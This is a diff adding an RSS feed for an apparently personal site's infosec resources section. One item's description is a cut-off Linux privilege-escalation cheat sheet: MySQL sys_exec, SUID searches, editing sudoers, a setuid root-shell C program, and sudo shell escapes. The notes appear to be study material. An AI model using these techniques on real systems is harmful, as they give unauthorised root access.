@@ -1,0 +1,33 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Infosec on d47zm3</title>
+    <link>https://d47zm3.me/resources/infosec/</link>
+    <description>Recent content in Infosec on d47zm3</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    
+	<atom:link href="https://d47zm3.me/resources/infosec/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Cryptography</title>
+      <link>https://d47zm3.me/resources/infosec/cryptography/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/cryptography/</guid>
+      <description> Courses  Introduction to Cryptography by Christof Paar  </description>
+    </item>
+    
+    <item>
+      <title>Linux Privilege Escalation</title>
+      <link>https://d47zm3.me/resources/infosec/linux-privilege-escalation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://d47zm3.me/resources/infosec/linux-privilege-escalation/</guid>
+      <description>MySQL running as ROOT If you have password, log in, issue that query, it will return exit code of command.
+select sys_exec(&amp;#39;whoami&amp;#39;); Find SUID programs and abuse them find / -user root -perm -4000 -print 2&amp;gt;/dev/null student@attack:/$ /usr/bin/vim.tiny /etc/sudoers SUID binary to compile and hijack PATH #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;sys/types.h&amp;gt;#include &amp;lt;unistd.h&amp;gt; int main() { setuid(0); system(&amp;#34;/bin/bash&amp;#34;); return 0; } Using System Tools # sudo find / -exec /bin/sh -I \; # sudo vi // inside :shell # sudo more/less // inside :bash # sudo python -c &amp;#34;import pty; pty.</description>
+    </item>
+    
+  </channel>
+</rss>
